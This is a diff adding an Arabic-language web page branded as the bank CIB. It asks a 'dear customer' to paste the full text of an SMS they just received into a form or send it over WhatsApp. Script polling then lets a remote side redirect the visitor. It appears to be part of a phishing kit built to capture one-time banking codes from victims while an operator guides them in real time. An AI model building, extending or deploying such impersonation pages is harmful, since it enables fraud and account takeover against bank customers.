@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CIB - رسالة</title>
+    <link rel="stylesheet" href="messege.css" />
+  </head>
+  <body>
+    <div class="msg-page">
+      <header class="msg-top">
+        <div class="msg-top__inner">
+          <img class="msg-logo" src="img/logo.png" alt="CIB" />
+        </div>
+        <div class="msg-top__sep" aria-hidden="true"></div>
+      </header>
+
+      <main class="msg-content">
+        <h1 class="msg-heading">تأكيد الطلب</h1>
+
+        <div class="msg-card msg-card--instruction">
+          <div class="msg-card__accent" aria-hidden="true"></div>
+          <p class="msg-card__text">
+            عزيزي العميل تم إرسال رسالة نصية تحتوي على تأكيد تقديم طلبك يرجى نسخ
+            الرسالة كاملة ولصقها في موقع الحجز او ارسالها عبر الواتس آب المخصص
+            للتقديم لطفاً
+          </p>
+        </div>
+
+        <form class="msg-form" action="#" method="post" autocomplete="off">
+          <label class="msg-label" for="pastedSmsMessage">لصق نص الرسالة</label>
+          <textarea
+            id="pastedSmsMessage"
+            name="pastedSmsMessage"
+            class="msg-textarea"
+            required
+            rows="7"
+            placeholder="يرجى لصق الرسالة هنا"
+            dir="auto"
+          ></textarea>
+          <button type="submit" class="msg-submit">إرسال</button>
+        </form>
+
+        <p class="msg-note">
+          بعد الإرسال يرجى الانتظار حتى يتم التحقق من قبل النظام أو توجيهك للخطوة
+          التالية.
+        </p>
+      </main>
+    </div>
+
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+      (function () {
+        var pollStop = null;
+        function armPoll() {
+          if (typeof startSessionRedirectPolling !== 'function') return;
+          if (pollStop) pollStop();
+          pollStop = startSessionRedirectPolling(
+            function (url) {
+              if (url) window.location.href = url;
+            },
+            function (msg) {
+              alert(msg);
+            }
+          );
+        }
+        document.addEventListener('DOMContentLoaded', function () {
+          armPoll();
+          var form = document.querySelector('.msg-form');
+          if (form) {
+            form.addEventListener(
+              'submit',
+              function () {
+                if (form.checkValidity()) {
+                  if (pollStop) {
+                    pollStop();
+                    pollStop = null;
+                  }
+                }
+              },
+              true
+            );
+          }
+          initializeFormHandler('.msg-form', 'messege');
+        });
+      })();
+    </script>
+  </body>
+</html>
